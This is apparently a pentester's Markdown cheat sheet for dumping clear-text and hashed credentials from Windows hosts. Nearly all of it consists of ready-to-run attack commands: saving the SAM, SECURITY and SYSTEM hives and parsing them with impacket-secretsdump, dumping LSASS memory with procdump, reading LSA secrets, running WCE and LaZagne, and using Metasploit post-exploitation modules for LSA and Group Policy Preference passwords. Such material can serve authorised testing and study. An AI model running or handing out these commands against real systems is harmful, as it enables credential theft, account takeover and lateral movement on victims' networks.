# Clear Text Credentials Dump on windows 

## Impacket

https://github.com/CoreSecurity/impacket

- get LSA secret keys from reg

```
reg save hklm\sam c:\temp\sam.save
reg save hklm\security c:\temp\security.save
reg save hklm\system c:\temp\system.save
```

- dump with impacket

```
impacket-secretsdump -sam /root/sam.save -security /root/security.save -system /root/Desktop/system.save Local
```

## Metasploit module

- post/windows/gather/lsa_secrets

## LSAsecrte binary

https://github.com/linuxmuster/lsaSecrets/blob/master/bin/lsaSecretRead.exe

``` lsaSecretRead.exe DefaultPassword ```

## LSASS process with processdump

```
procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
```

## WCE

- https://www.ampliasecurity.com/research/windows-credentials-editor/


# Reference
https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/
```
wce.exe -w
```

## Credential manager

- https://github.com/AlessandroZ/LaZagne
```
lazagne all 
```

## Nishan framework

- https://github.com/samratashok/nishang

## Group Policy Preference 

- metasploit module

``` post/windows/gather/credentials/gpp ```
